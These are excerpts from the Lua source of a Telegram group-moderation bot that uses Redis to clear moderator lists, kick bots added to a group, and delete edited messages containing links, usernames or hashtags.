if data.channel_.status_.ID == "ChatMemberStatusKicked" then    local list = MARX:smembers(DEVSTOR..'moder'..'-100'..data.channel_.id_)   for k, v in pairs(list) do    MARX:srem(DEVSTOR..'moder'..'-100'..data.channel_.id_,v)      end   local list = MARX:smembers(DEVSTOR..'modergroup'..'-100'..data.channel_.id_)   for k, v in pairs(list) do    MARX:srem(DEVSTOR..'modergroup'..'-100'..data.channel_.id_,v)      end   local list = MARX:smembers(DEVSTOR..'mods:'..'-100'..data.channel_.id_)   for k, v in pairs(list) do    MARX:srem(DEVSTOR..'mods:'..'-100'..data.channel_.id_,v)      end   local list = MARX:smembers(DEVSTOR..'vip:group'..'-100'..data.channel_.id_)    for k, v in pairs(list) do    MARX:srem(DEVSTOR..'vip:group'..'-100'..data.channel_.id_,v)      end
...
MARX:srem(DEVSTOR..'bot:gpsby:id',idch) 
tdcli_function({ID="GetChat",chat_id_ = '-100'..data.channel_.id_},function(arg,data)  linkgp = MARX:get(DEVSTOR.."link:group"..idch)  
...
local list = MARX:smembers(DEVSTOR..'moder'..'-100'..data.channel_.id_)   for k, v in pairs(list) do    MARX:srem(DEVSTOR..'moder'..'-100'..data.channel_.id_,v)      end   local list = MARX:smembers(DEVSTOR..'modergroup'..'-100'..data.channel_.id_)   for k, v in pairs(list) do    MARX:srem(DEVSTOR..'modergroup'..'-100'..data.channel_.id_,v)      end   local list = MARX:smembers(DEVSTOR..'mods:'..'-100'..data.channel_.id_)   for k, v in pairs(list) do    MARX:srem(DEVSTOR..'mods:'..'-100'..data.channel_.id_,v)      end   local list = MARX:smembers(DEVSTOR..'vip:group'..'-100'..data.channel_.id_)    for k, v in pairs(list) do    MARX:srem(DEVSTOR..'vip:group'..'-100'..data.channel_.id_,v)      end
rem_group('-100'..data.channel_.id_)   
MARX:sadd(DEVSTOR..'botgps','-100'..data.channel_.id_) 
end  
end
...
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and MARX:get(DEVSTOR.."lock:Bot:kick"..msg.chat_id_) == 'del'  and not is_vipgroup(msg) then  
...
if msg.content_.ID == "MessageChatDeleteMember" and MARX:get(DEVSTOR..'lock:tagservrbot'..msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end 
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and MARX:get(DEVSTOR.."lock:Bot:kick"..msg.chat_id_) == 'ked' and not is_vipgroup(msg) then  
kick(msg,msg.chat_id_,mem_id[i].id_)
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)
end  
...
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and MARX:get(DEVSTOR.."lock:Bot:kick"..msg.chat_id_) == 'kick' and not is_vipgroup(msg) then  
kick(msg,msg.chat_id_,mem_id[i].id_)
...
if MARX:get(DEVSTOR..'lock:edit:media'..data.chat_id_) then 
...
if txxt:find("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") and MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then 
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find(".[Pp][Ee]") and MARX:get(DEVSTOR..'lock:links'..msg.chat_id_) then 
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") and MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then 
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") and MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then 
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find("[Tt].[Mm][Ee]/") and MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then 
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find("[Ww][Ww][Ww].") and MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then 
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find(".[Cc][Oo][Mm]") then
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) and MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end    
if txxt:find('@[%a%d_]+') and MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "del" then
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end
if txxt:find('@(.+)') and MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "del" then
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end
if txxt:find('#[%a%d_]+') and MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "del" then
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end
if txxt:find('#(.+)') and MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "del" then
if MARX:get(DEVSTOR..'lock:edit'..data.chat_id_) then 
delete_msg(data.chat_id_,{[0] = data.message_id_}) 
end    
end
...
MARX:set(DEVSTOR..'group:name'..v,data.title_)
